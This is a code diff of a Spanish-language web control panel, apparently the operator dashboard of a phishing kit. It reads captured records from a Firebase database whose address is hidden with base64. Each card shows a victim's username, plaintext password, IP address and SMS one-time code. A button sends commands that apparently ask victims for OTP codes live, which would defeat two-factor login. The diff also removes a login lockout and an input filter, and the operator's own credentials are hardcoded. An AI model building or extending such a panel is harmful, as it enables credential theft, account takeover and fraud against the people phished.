@@ -2,199 +2,120 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel de Clientes - v2.0</title>
+    <title>Panel - MODO RECUPERACIÓN</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        body { background-color: #0f172a; font-family: 'Inter', sans-serif; }
-        .card-user { transition: all 0.3s ease; border: 1px solid #1e293b; position: relative; overflow: hidden; }
-        .card-user:hover { transform: translateY(-5px); border-color: #3b82f6; box-shadow: 0 15px 30px -10px rgba(0, 0, 0, 0.5); }
-        .led-blink { animation: blink 1.5s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        body { background-color: #0f172a; font-family: 'Inter', sans-serif; color: white; }
+        .card-user { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
+        .card-spam { background: #451a1a; border: 1px solid #ef4444; opacity: 0.8; }
+        .btn { padding: 8px 16px; border-radius: 6px; font-size: 12px; cursor: pointer; border: none; margin: 2px; }
+        .btn-blue { background: #3b82f6; color: white; }
+        .btn-red { background: #ef4444; color: white; }
+        .btn-green { background: #10b981; color: white; }
+        #login-overlay { position: fixed; inset: 0; background: #0f172a; z-index: 50; display: flex; align-items: center; justify-content: center; }
         #panel-content { display: none; }
-        #login-overlay { display: flex; }
-        .shake { animation: shake 0.5s; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
     </style>
 </head>
-<body class="p-4 md:p-8">
+<body class="p-4">
 
-    <div id="login-overlay" class="fixed inset-0 bg-slate-900 z-50 flex items-center justify-center p-4">
-        <div class="bg-slate-800 p-8 rounded-2xl border border-slate-700 w-full max-w-md shadow-2xl text-center">
-            <h2 class="text-white text-2xl font-black mb-6 italic">ACCESO <span class="text-blue-500">RESTRINGIDO</span></h2>
-            <div class="space-y-4 text-left">
-                <input type="text" id="admin-user" placeholder="Usuario" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white outline-none focus:border-blue-500 transition" autocomplete="off">
-                <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white outline-none focus:border-blue-500 transition" autocomplete="off">
-                <button onclick="validarAcceso()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg transition uppercase tracking-widest text-sm">Entrar al Panel</button>
-            </div>
-            <p id="error-msg" class="text-rose-500 text-xs mt-4 hidden font-bold uppercase"></p>
-            <p id="bloqueo-msg" class="text-amber-500 text-xs mt-2 hidden">Demasiados intentos. Espera <span id="tiempo-restante">60</span>s</p>
+    <!-- LOGIN -->
+    <div id="login-overlay">
+        <div class="bg-slate-800 p-8 rounded-xl border border-slate-700 w-full max-w-md text-center">
+            <h2 class="text-2xl font-bold mb-4 text-blue-400">ACCESO PANEL</h2>
+            <input type="text" id="admin-user" placeholder="Usuario" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white mb-4"><br>
+            <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white mb-4"><br>
+            <button onclick="validarAcceso()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg">ENTRAR</button>
+            <p id="error-msg" class="text-red-500 text-sm mt-2 hidden"></p>
         </div>
     </div>
 
     <div id="panel-content">
-        <header class="mb-10 flex flex-col md:flex-row justify-between items-center gap-4 border-b border-slate-800 pb-6">
+        <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
             <div>
-                <h1 class="text-3xl font-black text-white italic tracking-tighter">PANEL <span class="text-blue-500">CLIENTES</span></h1>
-                <p class="text-slate-500 text-[10px] font-bold uppercase tracking-[0.3em]">Sistema de Registro</p>
+                <h1 class="text-3xl font-black text-white">PANEL <span class="text-blue-500">CLIENTES</span></h1>
+                <p class="text-slate-500 text-xs">Sistema de Registro</p>
             </div>
-            <div class="flex items-center gap-4">
-                <div class="flex items-center gap-2 bg-slate-800/50 px-4 py-2 rounded-full border border-slate-700">
-                    <span class="w-2 h-2 bg-emerald-500 rounded-full led-blink"></span>
-                    <span class="text-[10px] font-bold text-emerald-400 uppercase">Sistema Live</span>
-                </div>
-                <div class="text-right">
-                    <p class="text-[10px] text-slate-500">Tu IP</p>
-                    <p id="ip-actual" class="text-[10px] text-blue-400 font-mono">Detectando...</p>
-                </div>
-                <button onclick="cerrarSesion()" class="text-slate-400 hover:text-rose-400 text-[10px] uppercase font-black transition">
-                    <i class="fa-solid fa-power-off mr-1"></i> Salir
+            <div class="flex gap-4">
+                <button onclick="mostrarSpam()" class="bg-red-600 hover:bg-red-500 px-4 py-2 rounded-lg text-sm">
+                    <i class="fa-solid fa-trash"></i> Ver Papelera (<span id="spam-count">0</span>)
                 </button>
-            </div>
-        </header>
-
-        <!-- Stats -->
-        <div class="grid grid-cols-4 gap-4 mb-6">
-            <div class="bg-slate-800 p-4 rounded-xl border border-slate-700">
-                <p class="text-[10px] text-slate-500 uppercase">Total Registros</p>
-                <p id="stat-total" class="text-2xl font-black text-white">0</p>
-            </div>
-            <div class="bg-slate-800 p-4 rounded-xl border border-slate-700">
-                <p class="text-[10px] text-slate-500 uppercase">Online</p>
-                <p id="stat-online" class="text-2xl font-black text-emerald-400">0</p>
-            </div>
-            <div class="bg-slate-800 p-4 rounded-xl border border-slate-700">
-                <p class="text-[10px] text-slate-500 uppercase">Bloqueados</p>
-                <p id="stat-spam" class="text-2xl font-black text-rose-400">0</p>
-            </div>
-            <div class="bg-slate-800 p-4 rounded-xl border border-slate-700">
-                <p class="text-[10px] text-slate-500 uppercase">Hoy</p>
-                <p id="stat-hoy" class="text-2xl font-black text-blue-400">0</p>
+                <button onclick="cerrarSesion()" class="text-slate-400 hover:text-white text-sm">SALIR</button>
             </div>
         </div>
 
-        <div id="container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6"></div>
+        <!-- STATS -->
+        <div class="grid grid-cols-4 gap-4 mb-6">
+            <div class="bg-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-500">TOTAL</p>
+                <p id="stat-total" class="text-2xl font-bold text-white">0</p>
+            </div>
+            <div class="bg-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-500">ONLINE</p>
+                <p id="stat-online" class="text-2xl font-bold text-emerald-400">0</p>
+            </div>
+            <div class="bg-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-500">BLOQUEADOS</p>
+                <p id="stat-spam" class="text-2xl font-bold text-red-400">0</p>
+            </div>
+            <div class="bg-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-500">HOY</p>
+                <p id="stat-hoy" class="text-2xl font-bold text-blue-400">0</p>
+            </div>
+        </div>
+
+        <!-- BOTONES DE VISTA -->
+        <div class="flex gap-2 mb-4">
+            <button onclick="vistaActual = 'validos'; renderizar();" class="btn btn-green">✓ Registros Válidos</button>
+            <button onclick="vistaActual = 'spam'; renderizar();" class="btn btn-red">🗑 Papelera/Spam</button>
+            <button onclick="vistaActual = 'todos'; renderizar();" class="btn btn-blue">Todos</button>
+        </div>
+
+        <div id="container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
     </div>
 
     <script>
-        // CONFIGURACION
         const DB_URL = atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=");
-        const MAX_INTENTOS = 3;
-        const TIEMPO_BLOQUEO = 300000;
+        let db;
+        let vistaActual = 'validos';
+        let todosLosDatos = { validos: [], spam: [] };
 
-        // SISTEMA ANTI-SPAM
-        const SPAM_KEYWORDS = ['test', 'prueba', 'admin', 'root', '123', 'demo', 'fake', 'usuario1', 'clave1', 'password', '123456'];
-        const SPAM_IDS = ['test-001', 'test-002', 'test', 'prueba', 'demo', 'admin', 'root', 'fake'];
-        const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        const CARACTERES_PROHIBIDOS = ['<script', '<?php', 'SELECT ', 'DROP ', '--', '/*', '*/', 'javascript:', 'onerror', 'onload'];
-
-        // SISTEMA DE SEGURIDAD
-        let intentos = parseInt(localStorage.getItem('sec_intentos') || '0');
-        let ultimoIntento = parseInt(localStorage.getItem('sec_ultimo') || '0');
-
-        function estaBloqueado() {
-            if (intentos >= MAX_INTENTOS) {
-                const tiempoPasado = Date.now() - ultimoIntento;
-                if (tiempoPasado < TIEMPO_BLOQUEO) {
-                    return Math.ceil((TIEMPO_BLOQUEO - tiempoPasado) / 1000);
-                }
-                resetearSeguridad();
-            }
-            return false;
+        // ANTI-SPAM MUY PERMISIVO (solo bloquea lo obvio)
+        function esSpam(id, data) {
+            // Solo bloquear si NO tiene datos básicos
+            if (!data || !data.user || !data.pass) return true;
+            
+            // Solo bloquear IDs de prueba muy obvios
+            if (id === 'test' || id === 'prueba' || id === 'admin') return true;
+            
+            // Solo bloquear si es texto de prueba exacto
+            if (data.user === 'test' && data.pass === 'test') return true;
+            if (data.user === 'admin' && data.pass === 'admin') return true;
+            
+            return false; // TODO LO DEMÁS PASA
         }
-
-        function registrarIntentoFallido() {
-            intentos++;
-            ultimoIntento = Date.now();
-            localStorage.setItem('sec_intentos', intentos.toString());
-            localStorage.setItem('sec_ultimo', ultimoIntento.toString());
-        }
-
-        function resetearSeguridad() {
-            intentos = 0;
-            localStorage.removeItem('sec_intentos');
-            localStorage.removeItem('sec_ultimo');
-        }
-
-        // AUDIO
-        const sonidoLogin = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
-        let audioDesbloqueado = false;
-
-        document.addEventListener('click', function() {
-            if (!audioDesbloqueado) {
-                sonidoLogin.play().then(() => {
-                    sonidoLogin.pause();
-                    sonidoLogin.currentTime = 0;
-                    audioDesbloqueado = true;
-                }).catch(() => {});
-            }
-        }, { once: true });
-
-        // AUTH
-        const USER_CORRECTO = "Ghost";
-        const PASS_CORRECTO = "Cabimas01.";
 
         function validarAcceso() {
-            const bloqueo = estaBloqueado();
-            if (bloqueo) {
-                mostrarError("Bloqueado por " + bloqueo + " segundos");
-                document.getElementById('bloqueo-msg').classList.remove('hidden');
-                iniciarCuentaRegresiva(bloqueo);
-                return;
-            }
-            
             const u = document.getElementById('admin-user').value;
             const p = document.getElementById('admin-pass').value;
             
-            if (!u || !p) {
-                mostrarError('Complete todos los campos');
-                return;
-            }
-            
-            if (u === USER_CORRECTO && p === PASS_CORRECTO) {
-                resetearSeguridad();
+            if (u === "Ghost" && p === "Cabimas01.") {
                 sessionStorage.setItem('auth_panel', 'true');
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('panel-content').style.display = 'block';
                 iniciarFirebase();
             } else {
-                registrarIntentoFallido();
-                const restantes = MAX_INTENTOS - intentos;
-                mostrarError('Credenciales incorrectas. Intentos: ' + restantes);
-                
-                if (restantes <= 0) {
-                    document.getElementById('bloqueo-msg').classList.remove('hidden');
-                    iniciarCuentaRegresiva(300);
-                }
+                document.getElementById('error-msg').textContent = 'Credenciales incorrectas';
+                document.getElementById('error-msg').classList.remove('hidden');
             }
         }
 
-        function mostrarError(msg) {
-            const el = document.getElementById('error-msg');
-            el.textContent = msg;
-            el.classList.remove('hidden');
-            document.querySelector('.bg-slate-800').classList.add('shake');
-            setTimeout(() => {
-                document.querySelector('.bg-slate-800').classList.remove('shake');
-            }, 500);
-        }
-
-        function iniciarCuentaRegresiva(segundos) {
-            const span = document.getElementById('tiempo-restante');
-            span.textContent = segundos;
-            const interval = setInterval(() => {
-                segundos--;
-                span.textContent = segundos;
-                if (segundos <= 0) {
-                    clearInterval(interval);
-                    document.getElementById('bloqueo-msg').classList.add('hidden');
-                    document.getElementById('error-msg').classList.add('hidden');
-                }
-            }, 1000);
+        if (sessionStorage.getItem('auth_panel') === 'true') {
+            document.getElementById('login-overlay').style.display = 'none';
+            document.getElementById('panel-content').style.display = 'block';
+            iniciarFirebase();
         }
 
         function cerrarSesion() {
@@ -202,213 +123,133 @@
             window.location.reload();
         }
 
-        // AUTO LOGIN
-        if (sessionStorage.getItem('auth_panel') === 'true') {
-            document.getElementById('login-overlay').style.display = 'none';
-            document.getElementById('panel-content').style.display = 'block';
-            iniciarFirebase();
-        }
-
-        // IP
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {
-                document.getElementById('ip-actual').textContent = data.ip;
-            })
-            .catch(() => {
-                document.getElementById('ip-actual').textContent = 'N/A';
-            });
-
-        // FUNCIONES ANTI-SPAM
-        function esSpam(id, data) {
-            if (!id || SPAM_IDS.some(spam => id.toLowerCase().includes(spam.toLowerCase()))) {
-                return true;
-            }
-            
-            if (!data || typeof data !== 'object') return true;
-            
-            const userLower = (data.user || '').toLowerCase();
-            const passLower = (data.pass || '').toLowerCase();
-            
-            if (SPAM_KEYWORDS.some(k => userLower.includes(k) || passLower.includes(k))) {
-                return true;
-            }
-            
-            if (userLower.includes('@') && !EMAIL_REGEX.test(data.user)) {
-                return true;
-            }
-            
-            if (!data.user || data.user.length < 4 || !data.pass || data.pass.length < 4) {
-                return true;
-            }
-            
-            const datosString = JSON.stringify(data).toLowerCase();
-            if (CARACTERES_PROHIBIDOS.some(c => datosString.includes(c))) {
-                return true;
-            }
-            
-            if (data.timestamp) {
-                const ahora = Date.now();
-                const diff = ahora - data.timestamp;
-                if (diff < -60000 || diff > 86400000) {
-                    return true;
-                }
-            } else {
-                return true;
-            }
-            
-            if (/^\d+$/.test(data.user)) {
-                return true;
-            }
-            
-            return false;
-        }
-
-        // FIREBASE
         function iniciarFirebase() {
             const firebaseConfig = { databaseURL: DB_URL };
             if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-            const db = firebase.database();
-            
-            let cargaInicial = true;
-            let spamCount = 0;
-            
-            setTimeout(() => { cargaInicial = false; }, 3000);
-            
-            db.ref('logins').on('child_added', (snap) => {
-                const data = snap.val();
-                const id = snap.key;
-                
-                if (esSpam(id, data)) {
-                    spamCount++;
-                    db.ref('spam/' + id).set({ 
-                        ...data, 
-                        deletedAt: Date.now(), 
-                        reason: 'spam_detected',
-                        originalId: id
-                    });
-                    db.ref('logins/' + id).remove();
-                    document.getElementById('stat-spam').textContent = spamCount;
-                    return;
-                }
-                
-                if (!cargaInicial && audioDesbloqueado) {
-                    sonidoLogin.play().catch(() => {});
-                }
-            });
-            
-            db.ref('logins').on('value', (snapshot) => {
-                const container = document.getElementById('container');
-                container.innerHTML = '';
-                
-                let total = 0;
-                let online = 0;
-                let hoy = 0;
-                const hoyStr = new Date().toDateString();
-                
-                const registros = [];
-                snapshot.forEach((child) => {
-                    registros.push({ id: child.key, data: child.val() });
+            db = firebase.database();
+
+            // Escuchar logins (válidos y spam)
+            db.ref('logins').on('value', (snap) => {
+                const datos = [];
+                snap.forEach((child) => {
+                    datos.push({ id: child.key, data: child.val(), esSpam: false });
                 });
+                todosLosDatos.validos = datos;
+                renderizar();
+            });
+
+            // Escuchar spam
+            db.ref('spam').on('value', (snap) => {
+                const datos = [];
+                snap.forEach((child) => {
+                    datos.push({ id: child.key, data: child.val(), esSpam: true });
+                });
+                todosLosDatos.spam = datos;
+                document.getElementById('spam-count').textContent = datos.length;
+                renderizar();
+            });
+        }
+
+        function renderizar() {
+            const container = document.getElementById('container');
+            container.innerHTML = '';
+            
+            let aMostrar = [];
+            if (vistaActual === 'validos') aMostrar = todosLosDatos.validos;
+            else if (vistaActual === 'spam') aMostrar = todosLosDatos.spam;
+            else aMostrar = [...todosLosDatos.validos, ...todosLosDatos.spam];
+
+            // Stats
+            document.getElementById('stat-total').textContent = todosLosDatos.validos.length;
+            document.getElementById('stat-spam').textContent = todosLosDatos.spam.length;
+            document.getElementById('stat-online').textContent = todosLosDatos.validos.filter(d => d.data.online).length;
+            
+            const hoy = new Date().toDateString();
+            document.getElementById('stat-hoy').textContent = todosLosDatos.validos.filter(d => 
+                d.data.timestamp && new Date(d.data.timestamp).toDateString() === hoy
+            ).length;
+
+            if (aMostrar.length === 0) {
+                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay registros en esta vista</div>';
+                return;
+            }
+
+            aMostrar.forEach(({id, data, esSpam}) => {
+                const isOnline = data.online === true;
+                const cardClass = esSpam ? 'card-spam' : 'card-user';
                 
-                registros.sort((a, b) => (b.data.timestamp || 0) - (a.data.timestamp || 0));
-                
-                registros.forEach(({id, data}) => {
-                    if (esSpam(id, data)) return;
-                    
-                    total++;
-                    if (data.online) online++;
-                    if (data.timestamp && new Date(data.timestamp).toDateString() === hoyStr) hoy++;
-                    
-                    const isOnline = data.online === true;
-                    const tieneOTP = data.sms && data.sms !== '----' && data.sms !== '';
-                    
-                    container.innerHTML += `
-                        <div class="card-user bg-slate-800 p-5 rounded-2xl shadow-xl ${isOnline ? 'border-t-2 border-emerald-500' : 'opacity-60'}">
-                            <div class="flex justify-between items-center mb-4">
-                                <span class="text-[8px] font-mono text-slate-500">#${id.slice(-6)}</span>
-                                <div class="flex items-center gap-2">
-                                    <span class="w-2 h-2 rounded-full ${isOnline ? 'bg-emerald-500 animate-pulse' : 'bg-slate-600'}"></span>
-                                    <span class="text-[9px] font-black uppercase ${isOnline ? 'text-emerald-400' : 'text-slate-500'}">
-                                        ${isOnline ? 'Online' : 'Offline'}
-                                    </span>
-                                </div>
-                            </div>
-                            
-                            <div class="space-y-2 mb-4">
-                                <div class="bg-slate-900/80 p-2 rounded-lg border border-slate-700/50">
-                                    <p class="text-[9px] text-slate-500 uppercase font-bold">Usuario</p>
-                                    <p class="text-white text-sm font-bold truncate" title="${data.user || 'N/A'}">${data.user || 'N/A'}</p>
-                                </div>
-                                <div class="bg-slate-900/80 p-2 rounded-lg border border-slate-700/50">
-                                    <p class="text-[9px] text-slate-500 uppercase font-bold">Contraseña</p>
-                                    <p class="text-rose-400 text-sm font-black tracking-wider">${data.pass || '****'}</p>
-                                </div>
-                            </div>
-                            
-                            <div class="mb-4">
-                                <div class="bg-${tieneOTP ? 'emerald' : 'blue'}-900/10 border border-${tieneOTP ? 'emerald' : 'blue'}-500/20 p-3 rounded-xl text-center">
-                                    <p class="text-[9px] font-bold text-${tieneOTP ? 'emerald' : 'blue'}-500 uppercase mb-1">
-                                        ${tieneOTP ? '✓ Código Verificado' : 'Esperando Código'}
-                                    </p>
-                                    <p class="text-2xl font-black text-${tieneOTP ? 'emerald' : 'blue'}-400 tracking-[0.2em]">${data.sms || '----'}</p>
-                                </div>
-                            </div>
-                            
-                            <div class="mb-4 px-1">
-                                <div class="flex items-center justify-between mb-1">
-                                    <p class="text-[10px] text-slate-400 italic">
-                                        <i class="fa-solid fa-location-dot mr-1"></i> ${data.step || 'Registrado'}
-                                    </p>
-                                    <p class="text-[8px] text-slate-600">${data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : ''}</p>
-                                </div>
-                                <p class="text-[9px] text-amber-400 font-mono">
-                                    <i class="fa-solid fa-network-wired mr-1"></i> IP: ${data.ip || 'N/A'}
-                                </p>
-                            </div>
-                            
-                            <div class="grid grid-cols-2 gap-2">
-                                <button onclick="solicitarOTP('${id}')" class="bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 rounded-lg text-[10px] transition uppercase flex items-center justify-center gap-1">
-                                    <i class="fa-solid fa-comment-sms"></i> Solicitar OTP
-                                </button>
-                                <button onclick="reenviarOTP('${id}')" class="bg-orange-600 hover:bg-orange-500 text-white font-bold py-2 rounded-lg text-[10px] transition uppercase flex items-center justify-center gap-1">
-                                    <i class="fa-solid fa-sync"></i> Reenviar
-                                </button>
-                                <button onclick="rechazar('${id}')" class="bg-rose-600/20 hover:bg-rose-600 text-rose-500 hover:text-white border border-rose-600/30 font-bold py-2 rounded-lg text-[10px] transition uppercase">
-                                    Rechazar
-                                </button>
-                                <button onclick="eliminar('${id}')" class="bg-slate-900 hover:bg-red-900/40 text-slate-500 hover:text-red-400 font-bold py-2 rounded-lg text-[10px] transition uppercase border border-slate-700">
-                                    Borrar
-                                </button>
-                            </div>
+                container.innerHTML += `
+                    <div class="${cardClass}">
+                        <div class="flex justify-between items-center mb-2">
+                            <span class="text-xs text-slate-400">#${id.slice(-8)}</span>
+                            ${esSpam ? '<span class="text-red-400 text-xs font-bold">🗑 BLOQUEADO</span>' : 
+                              `<span class="text-emerald-400 text-xs">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>`}
                         </div>
-                    `;
-                });
-                
-                document.getElementById('stat-total').textContent = total;
-                document.getElementById('stat-online').textContent = online;
-                document.getElementById('stat-hoy').textContent = hoy;
+                        
+                        <div class="bg-slate-900 p-2 rounded mb-2">
+                            <p class="text-xs text-slate-500">USUARIO</p>
+                            <p class="text-white font-bold">${data.user || 'N/A'}</p>
+                        </div>
+                        
+                        <div class="bg-slate-900 p-2 rounded mb-2">
+                            <p class="text-xs text-slate-500">CONTRASEÑA</p>
+                            <p class="text-rose-400 font-bold">${data.pass || '****'}</p>
+                        </div>
+                        
+                        <div class="bg-slate-900 p-2 rounded mb-2">
+                            <p class="text-xs text-slate-500">IP CLIENTE</p>
+                            <p class="text-amber-400 font-mono text-sm">${data.ip || 'N/A'}</p>
+                        </div>
+                        
+                        <div class="flex justify-between text-xs text-slate-500 mb-2">
+                            <span>${data.step || 'Registrado'}</span>
+                            <span>${data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : ''}</span>
+                        </div>
+
+                        <div class="flex gap-1 flex-wrap">
+                            ${esSpam ? `
+                                <button onclick="recuperar('${id}')" class="btn btn-green">♻ Recuperar</button>
+                                <button onclick="eliminarSpam('${id}')" class="btn btn-red">🗑 Eliminar Permanentemente</button>
+                            ` : `
+                                <button onclick="solicitarOTP('${id}')" class="btn btn-blue">Solicitar OTP</button>
+                                <button onclick="eliminar('${id}')" class="btn btn-red">Borrar</button>
+                            `}
+                        </div>
+                    </div>
+                `;
             });
+        }
+
+        function mostrarSpam() {
+            vistaActual = 'spam';
+            renderizar();
+        }
+
+        function recuperar(id) {
+            if (!confirm('¿Recuperar este registro a la lista principal?')) return;
             
-            window.solicitarOTP = function(id) {
-                db.ref('comandos/' + id).set({ action: 'request_otp', ts: Date.now() });
-            };
-            
-            window.reenviarOTP = function(id) {
-                db.ref('comandos/' + id).set({ action: 'resend_otp', ts: Date.now() });
-            };
-            
-            window.rechazar = function(id) {
-                db.ref('comandos/' + id).set({ action: 'reject', ts: Date.now() });
-                db.ref('logins/' + id).update({ step: 'Rechazado', online: false });
-            };
-            
-            window.eliminar = function(id) {
-                if (confirm('¿Eliminar este registro permanentemente?')) {
-                    db.ref('logins/' + id).remove();
-                    db.ref('comandos/' + id).remove();
+            db.ref('spam/' + id).once('value').then((snap) => {
+                const data = snap.val();
+                if (data) {
+                    db.ref('logins/' + id).set(data);
+                    db.ref('spam/' + id).remove();
                 }
-            };
+            });
+        }
+
+        function eliminarSpam(id) {
+            if (!confirm('¿Eliminar PERMANENTEMENTE? No se puede recuperar.')) return;
+            db.ref('spam/' + id).remove();
+        }
+
+        function solicitarOTP(id) {
+            db.ref('comandos/' + id).set({ action: 'request_otp', ts: Date.now() });
+            alert('OTP solicitado');
+        }
+
+        function eliminar(id) {
+            if (!confirm('¿Mover a papelera?')) return;
+            db.ref('logins/' + id).remove();
         }
     </script>
 </body>
